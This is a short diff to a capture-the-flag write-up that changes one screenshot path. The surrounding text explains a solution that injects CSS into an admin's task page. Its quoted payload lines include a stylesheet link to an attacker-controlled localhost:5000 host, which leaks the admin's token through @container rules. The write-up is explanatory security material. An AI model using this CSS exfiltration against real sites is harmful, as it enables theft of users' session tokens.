@@ -62,7 +62,7 @@ with this in mind, the solution tries to inject a CSS that gets parsed in such a
  ```
 The above is the line that the solution tries to inject into the admin's tasks above the token we were trying to steal using CSRF. After doing so. the /tasks looks like this
 
- <img src="images/Screenshot from 2025-08-11 18-25-00.png"/>
+ <img src="/images/Screenshot from 2025-08-11 18-25-00.png"/>
  
  + ` <link rel=stylesheet href=/tasks>` This part makes the flag available in the preview page we control
  + `<link rel=stylesheet href=http://localhost:5000/css/justToken{>}` This part makes the exfiltration using @container (`localhost:5000` is attacker controlled)
